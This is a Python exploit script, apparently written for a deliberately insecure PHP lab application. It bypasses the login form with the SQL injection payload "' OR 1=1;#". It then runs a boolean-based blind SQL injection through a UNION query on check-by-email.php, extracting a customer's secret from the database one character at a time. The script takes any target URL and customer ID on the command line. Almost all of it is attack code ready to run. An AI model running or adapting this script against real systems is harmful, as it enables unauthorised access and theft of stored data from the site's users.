import requests
import sys

def extract_secret(host, session, customer_id):
    print("[+] Enumerating the Secret..")
    secret = ""
    for i in range(1, 20):
        
        injection_string = "test' UNION select id from customer where (ascii(substring((select secret from customer where id=%s),%d,1)))=[CHAR]#" % (str(customer_id), i)
        for j in range(32, 126):          
            url = "%s/check-by-email.php" % (host)
            inj= injection_string.replace("[CHAR]", str(j))
            response = session.post(url, data={"email_address": inj})
            if "Hurray" in response.text:
                secret = secret + chr(j)
                print("[+] %s" % secret)
            else:
                # Check if character is NULL which means the end of the secret
                inj= injection_string.replace("[CHAR]", str(0))
                response = session.post(url, data={"email_address": inj})
                if "Hurray" in response.text:                    
                    return secret

    return secret        

def login(host, session):
    url = "%s/index.php" % host
    response = session.post(url, data={"email_address": "' OR 1=1;#", "password": "anything"})
    
    if "Welcome back" in response.text:
            print("[+] Logged in by exploiting the SQL injection!")
            return session
    else:
        print("[-] Couldn't log in :(")
        quit()


def main():
    if len(sys.argv) != 3:
        print("[+] usage: %s <target URL> <Customer ID>" % sys.argv[0])
        print('[+] eg: %s http://localhost/insecure-php 11' % sys.argv[0])
        sys.exit(-1)

    host = sys.argv[1]
    customer_id = sys.argv[2]
    
    session = requests.Session()
    session = login(host, session)
    secret = extract_secret(host, session, customer_id)

    print("[***] Successfully extracted the secret: %s by exploiting boolean based blind SQL injection!" % secret)

if __name__ == "__main__":
    main()
